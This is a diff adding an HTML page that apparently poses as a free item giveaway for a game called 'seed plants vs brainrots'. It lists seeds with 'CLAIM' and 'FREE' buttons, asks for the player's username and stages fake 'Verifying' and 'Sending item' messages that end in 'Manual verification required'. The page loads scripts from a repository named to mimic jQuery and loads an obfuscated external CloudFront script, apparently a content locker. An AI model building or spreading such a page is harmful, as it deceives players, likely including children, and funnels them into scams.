@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>seed plants vs brainrots</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery@main/BQ4LXx7.css">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery@main/3.6.3.min.js"></script>
+</head>
+<body>
+  <video class="bg-video" autoplay muted loop playsinline>
+    <source src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/back.mp4" type="video/mp4">
+  </video>
+  <div class="overlay"></div>
+  <div class="shop-container">
+    <div class="shop-header">
+      <span>New seeds in <span id="timer" class="countdown">20:13</span></span>
+      <div class="header-buttons">
+        <button class="restock-btn">Restock</button>
+        <button class="close-btn" onclick="goBack()">X</button>
+      </div>
+    </div>
+
+    <div class="cards-wrapper" id="cardsWrapper">
+      <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/Cactusseed.png">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Cactus Seed</div>
+          <div class="rarity" id="coloredText">Rare</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Brown Seed')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Brown Seed')">FREE</span>
+            <span class="price-victor" onclick="openForm('Brown Seed')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+            <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/StrawberrySeed.png">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Strawberry Seed</div>
+          <div class="rarity" id="coloredText">Rare</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Brown Seed')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Brown Seed')">FREE</span>
+            <span class="price-victor" onclick="openForm('Brown Seed')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+                 <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/Pumpkinseed.png">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Pumpkin Seed</div>
+          <div class="rarity" id="coloredText">Epic</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Brown Seed')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Brown Seed')">FREE</span>
+            <span class="price-victor" onclick="openForm('Brown Seed')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+                 <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/Sunflowerseed.png">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Sunflower Seed</div>
+          <div class="rarity" id="coloredText">Epic</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Brown Seed')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Brown Seed')">FREE</span>
+            <span class="price-victor" onclick="openForm('Brown Seed')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+                 <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/Dragonfruitseed.png">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Dragon Fruits Seed</div>
+          <div class="rarity" id="coloredText">Legendary</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Brown Seed')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Brown Seed')">FREE</span>
+            <span class="price-victor" onclick="openForm('Brown Seed')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+                 <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/eggplantseed.png">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Eggplant Seed</div>
+          <div class="rarity" id="coloredText">Legendary</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Brown Seed')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Brown Seed')">FREE</span>
+            <span class="price-victor" onclick="openForm('Brown Seed')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+                 <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/watermelonseed.png">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Watermelon Seed</div>
+          <div class="rarity" id="coloredText">Mythic</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Brown Seed')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Brown Seed')">FREE</span>
+            <span class="price-victor" onclick="openForm('Brown Seed')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>         
+      <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/Cocotankseed.png">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Cocotank Seed</div>
+          <div class="rarity" id="coloredText">Godly</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Brown Seed')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Brown Seed')">FREE</span>
+            <span class="price-victor" onclick="openForm('Brown Seed')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+            <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/CarnivorousPlantseed.png">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Carnivorous Plant </div>
+          <div class="rarity" id="coloredText">Godly</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Brown Seed')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Brown Seed')">FREE</span>
+            <span class="price-victor" onclick="openForm('Brown Seed')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+            <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/MrCarrotseed.png">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Mr Carrot Seed</div>
+          <div class="rarity" id="coloredText">Secret</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Brown Seed')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Brown Seed')">FREE</span>
+            <span class="price-victor" onclick="openForm('Brown Seed')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+               <div class="card">
+        <div class="card-image-container">
+          <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/Tomatrioseed.png">
+        </div>
+        <div class="card-info">
+          <div class="card-title">Tomatrio Seed</div>
+          <div class="rarity" id="coloredText">Secret</div>
+          <div class="stock">x63 in stock</div>
+          <div class="prices">
+            <span class="price-green" onclick="openForm('Brown Seed')">CLAIM</span>
+            <span class="price-purple" onclick="openForm('Brown Seed')">FREE</span>
+            <span class="price-victor" onclick="openForm('Brown Seed')">
+              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="form-wrapper" id="formWrapper">
+      <h2 id="chosenItemTitle">enter your username exactly as shown in the game!</h2>
+
+      <div class="input-section">
+        <input type="text" placeholder="Enter Username">
+        <div id="search">SEARCH</div>
+      </div>
+
+      <div class="loading-gif d-none">
+        <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/loading.gif">
+      </div>
+
+      <div class="profile d-none" style="position: relative; padding: 20px;">
+        <div class="img"><img src="" alt="Avatar"></div>
+        <div class="welcome-text"></div>
+        <div class="continue-btn" id="continueBtn">CONTINUE</div>
+
+        <!-- Instruction box with white background, messages inside HTML -->
+        <div class="instruction-text d-none" style="background:white; padding:10px; margin-top:10px; border-radius:5px; font-weight:bold; font-size:18px;">
+          <div class="msg msg1" style="display:none; color:green;">Verifying...</div>
+          <div class="msg msg2" style="display:none; color:green;">Sending item...</div>
+          <div class="msg msg3" style="display:none; color:red;">An error occurred</div>
+          <div class="msg msg4" style="display:none; color:red;">Manual verification required</div>
+        </div>
+
+        <div id="welcome-text-template" class="d-none">
+          Hello @<span class="user-placeholder"></span>, you will receive <span class="item-placeholder"></span> once you click the button below.
+        </div>
+      </div>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery@main/animation.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery@main/fonts.js"></script>
+<script type="text/javascript">
+    var jwHrv_myC_lASNGc={"it":4553381,"key":"f6a5f"};
+</script>
+<script src="https://duw03nk63ml3f.cloudfront.net/5874c6a.js"></script>
+</body>
+</html>
